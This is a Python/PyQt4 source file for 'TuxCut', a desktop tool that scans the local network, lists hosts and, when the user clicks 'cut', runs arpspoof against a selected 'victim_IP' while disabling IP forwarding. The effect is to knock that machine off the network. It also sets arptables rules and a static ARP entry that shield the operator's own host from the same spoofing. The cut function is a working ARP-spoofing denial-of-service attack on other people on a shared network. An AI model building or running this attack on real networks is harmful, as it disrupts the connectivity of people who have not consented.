# -*- coding: utf-8 -*-
import os
import socket
import subprocess as sp
from PyQt4 import QtCore,QtGui,uic

class TuxCut(QtGui.QMainWindow):
	def __init__(self):
		QtGui.QMainWindow.__init__(self)
		uic.loadUi('ui/MainWindow.ui',self)
		
		self._gwMAC=None
		self._iface =None
		self._isProtected = False
		self._isFedora = True
		
		self._gwIP = self.default_gw()
		self._gwMAC = self.gw_mac(self._gwIP)
		
		print "The Mac is :",self._gwMAC
		
		self.enable_protection()
		self.list_hosts(self._gwIP)
		
		self.resume_all()
		self.show_Window()
		
		
	def show_Window(self):
		screen = QtGui.QDesktopWidget().screenGeometry()
		size =  self.geometry()
		self.move((screen.width()-size.width())/2, (screen.height()-size.height())/2)

		self.table_hosts.setColumnWidth(0,150)
		self.table_hosts.setColumnWidth(1,150)
		self.table_hosts.setColumnWidth(2,75)
		self.show()

			
	def default_gw(self):
		args = ['route','list']
		gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
		for line in  gwip.stdout:
			if 'default' in line:
				self._iface = line.split()[4]
				return  line.split()[2]
				

	def gw_mac(self,gwip):
		arping = sp.Popen(['arp-scan','--interface',self._iface,self._gwIP],stdout = sp.PIPE)
		for line in arping.stdout:
			if line.startswith(self._gwIP.split('.')[0]):
				return line.split()[1]
				
	def list_hosts(self, ip):
		if self._isProtected:
			print "protected"
			#ans,unans = arping(net,timeout=3,verbose=False)
			arping = sp.Popen(['arp-scan','--interface',self._iface,ip],stdout = sp.PIPE)
		else:
			print "Not Protected"
			arping = sp.Popen(['arp-scan','--interface',self._iface,ip+'/24'],stdout = sp.PIPE)
		i=1
		for line in arping.stdout:
			if line.startswith(ip.split('.')[0]):
				print line.split()
				ip = line.split()[0]
				mac= line.split()[1]
				self.table_hosts.setRowCount(i)
				self.table_hosts.setItem(i-1,0,QtGui.QTableWidgetItem(ip))
				self.table_hosts.setItem(i-1,1,QtGui.QTableWidgetItem(mac))
				i=i+1
					

	def enable_protection(self):    
		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		self._isProtected = True
		if not self.cbox_protection.isChecked():
			self.cbox_protection.setCheckState(QtCore.Qt.Checked)
		
	def disable_protection(self):
		sp.Popen(['arptables','-P','IN','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','OUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		self._isProtected = False
		
	def cut_process(self,victim_IP):
		## Disable ip forward
		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		### Start Arpspoofing the victim
		#os.system("arpspoof -i " + self.icard + " -t " + self.gwip + " " + vicip + " & > /dev/null")
		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',victim_IP,self._gwIP,'&','>','/dev/null'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		print proc.pid
	
	def resume_all(self):
		sp.Popen(['sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		
	def on_protection_changes(self):
		if self.cbox_protection.isChecked():
			self.enable_protection()
		else:
			self.disable_protection()
			
	def on_refresh_clicked(self):
		self.list_hosts(self._gwIP)
	
	def on_cut_clicked(self):
		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
		if not victim_IP==None:
			self.cut_process(victim_IP)
